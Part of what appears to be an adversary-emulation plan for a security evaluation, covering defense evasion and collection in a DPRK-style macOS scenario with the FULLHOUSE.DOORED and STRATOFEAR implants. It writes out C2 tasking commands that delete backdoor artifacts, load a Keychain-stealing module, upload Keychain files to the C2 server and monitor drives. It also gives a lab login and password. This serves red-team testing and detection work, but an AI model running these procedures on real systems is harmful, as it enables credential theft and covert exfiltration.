<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED executes commands using NSTask</td>
<td><a href="../../resources/fullhouse.doored/src/core.hpp#L49">ExecuteCmd</a></td>
<td>T1106 Native API</td>
<td><a href="https://objective-see.org/blog/blog_0x77.html" class="outbound" target="_blank"><span>Objective-See</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED executes commands using /bin/zsh</td>
<td><a href="../../resources/fullhouse.doored/src/core.mm#L88">ExecuteCmd</a></td>
<td>T1059.004 Command and Scripting Interpreter: Unix Shell</td>
<td><a href="https://objective-see.org/blog/blog_0x77.html" class="outbound" target="_blank"><span>Objective-See</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED creates LaunchDaemon</td>
<td>-</td>
<td>T1543.004 Create or Modify System Process: Launch Daemon</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>FULLHOUSE.DOORED set STRATOFEAR as executable via chmod</td>
<td>-</td>
<td>T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification</td>
<td>-</td>
</tr>
<tr>
<td>FULLHOUSE.DOORED executes LaunchDaemon via launchctl</td>
<td>-</td>
<td>T1569.001 System Services: Launchctl</td>
<td>-</td>
</tr>
<tr>
<td>STRATOFEAR masquerades as Zoom files</td>
<td>-</td>
<td>T1036.005 Masquerading: Match Legitimate Name or Location</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR communicates over HTTPS</td>
<td><a href="../../resources/stratofear/src/implant/comms.hpp#L86">SendHTTPSRequest</a></td>
<td>T1071.001 Application Layer Protocol: Web Protocols</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR communicates over HTTPS</td>
<td><a href="../../resources/stratofear/src/implant/comms.hpp#L86">SendHTTPSRequest</a></td>
<td>T1573.002 Encrypted Channel: Asymmetric Cryptography</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-3---defense-evasion">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---defense-evasion">#</doc-anchor-trigger>
        <span>Step 3 - Defense Evasion</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>After installing the second-stage backdoor, DPRK removes the first-stage
backdoor. FULLHOUSE.DOORED will remove its configuration file and binary on
exit.</p>
<doc-anchor-target id="biohazard-procedures-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-3">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Task FULLHOUSE.DOORED to exit and clean itself up:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{&quot;id&quot;: 1, &quot;arg&quot;: &quot;rm -f com.docker.sock com.docker.sock.lock &amp;&amp; (sleep 7 &amp;&amp; pkill com.docker.sock ) &amp;&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the stopped beacons from FULLHOUSE.DOORED</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>FULLHOUSE.DOORED exits and deletes its artifacts</td>
<td>-</td>
<td>T1070.004 Indicator Removal: File Deletion</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="step-4---collection">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---collection">#</doc-anchor-trigger>
        <span>Step 4 - Collection</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>Next, DPRK uses STRATOFEAR to collect system information and exfiltrate targeted
Keychain files. STRATOFEAR executes the <code v-pre>0x07</code> command which collects and posts
the users, system, and OS information to the C2 server. STRATOFEAR then
downloads a module in the form of a macOS specific dynamic library
(.dylib file, similar to a .dll file for windows) Using the <code v-pre>0x62</code> command. The
module is saved to disk with a random 6 alphanumeric character filename in the
<code v-pre>/tmp</code> folder. Using <code v-pre>dlopen()</code> &amp; <code v-pre>dlsym()</code> API calls, the module is loaded into
STRATOFEAR&#x27;s process space and executed. The module executed saves the
Keychain file paths to an environment variable. STRATOFEAR then executes the
<code v-pre>0x64</code> command which uploads files to the  C2 server using the paths saved in
the environment variables set using the dylib file. DRPK then tasks STRATOFEAR to
monitor for all devices mounted to the system using the <code v-pre>0x47</code> command.</p>
<doc-anchor-target id="biohazard-procedures-4">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-4">#</doc-anchor-trigger>
        <span>:biohazard: Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Task STRATOFEAR to collect system information:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task gidle '{&quot;id&quot;: &quot;0x07&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the collected system information.</p>
</li>
<li><p>Task STRATOFEAR to download and execute the Keychain module:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task gidle '{&quot;id&quot;: &quot;0x62&quot;, &quot;args&quot;: &quot;libmodule_keychain.dylib&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Task STRATOFEAR to retrieve the module execution results:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task gidle '{&quot;id&quot;: &quot;0x64&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the C2 server output of the successful file download.</p>
</li>
<li><p>Task STRATOFEAR to monitor for when a device is mounted to the system:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task gidle '{&quot;id&quot;: &quot;0x47&quot;}'</code></pre>
</doc-codeblock></div>
</li>
</ul>
<blockquote>
<p><span class="docs-emoji">&#x23E9;</span> Emulate the following legitimate user activity:</p>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, initiate a
VNC session to the macOS victim workstation <code v-pre>hogshead (10.55.4.50)</code> as
<code v-pre>encryptpotter.net\ranrok</code> or use the existing VNC session if one is already open.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Hostname</th>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>hogshead.encryptpotter.net</td>
<td>encryptpotter.net\ranrok</td>
<td>Ladylike-Laugh</td>
</tr>
</tbody>
</table>
</div>
</li>
<li><p>Open Safari and navigate to <a href="https://slack.com/downloads/mac">https://slack.com/downloads/mac</a></p>
</li>
<li><p>Download and install Slack on the host</p>
</li>
</ul>
</blockquote>
<p><span class="docs-emoji">&#x1F6D1;</span> END OF SCENARIO</p>
<hr>
<doc-anchor-target id="verifying-event-monitoring">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#verifying-event-monitoring">#</doc-anchor-trigger>
        <span>Verifying Event Monitoring</span>
    </h4>
</doc-anchor-target>
<ul>
<li><p>Within the VNC to <code v-pre>hogshead (10.55.4.50)</code>, open a Terminal prompt and check
the monitoring log file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cat /Library/Fonts/AppleSDGothicNeo.ttc.1</code></pre>
</doc-codeblock></div>
</li>
<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the output from the log file.</p>
</li>
</ul>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation sub-steps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>STRATOFEAR uses <code v-pre>popen</code> to execute discovery commands</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L132">core.cpp</a></td>
<td>T1059.004 Command and Scripting Interpreter: Unix Shell</td>
<td></td>
</tr>
<tr>
<td>STRATOFEAR uses <code v-pre>logname</code> for current user discovery</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L156">core.cpp</a></td>
<td>T1033 System Owner/User Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/" class="outbound" target="_blank"><span>SentinelOne</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses <code v-pre>dscl . -list /Users \| grep -v '^_'</code> for users on system</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L162">core.cpp</a></td>
<td>T1033 System Owner/User Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/" class="outbound" target="_blank"><span>SentinelOne</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses <code v-pre>gethostname()</code> for hostname discovery</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L150">core.cpp</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/" class="outbound" target="_blank"><span>SentinelOne</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses <code v-pre>/usr/sbin/system_profiler SPHardwareDataType</code> to collect hardware information</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L158">core.cpp</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/" class="outbound" target="_blank"><span>SentinelOne</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses <code v-pre>/usr/bin/sw_vers</code> to collect OS &amp; build information</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L160">core.cpp</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/" class="outbound" target="_blank"><span>SentinelOne</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR dynamically loads modules from C2 using the <code v-pre>Initialize</code> function with <code v-pre>dlopen()</code> &amp; <code v-pre>dlsym()</code>.</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L121">core.cpp</a></td>
<td>T1129 Shared Modules</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR opens &amp; reads the system (<code v-pre>/Library/Keychains/System.keychain</code>) &amp; user (<code v-pre>/Users/user3/Library/Keychains/login.keychain-db</code>) Keychain files</td>
<td><a href="../../resources/stratofear/src/implant/comms.cpp#L73">comms.cpp</a></td>
<td>T1555.001 Credentials from Password Stores</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses an <code v-pre>FSEventStream</code> to collect all shared drive activity through monitoring the <code v-pre>/Volumes</code> folder</td>
<td><a href="../../resources/stratofear/src/implant/comms.cpp#L252">comms.cpp</a></td>
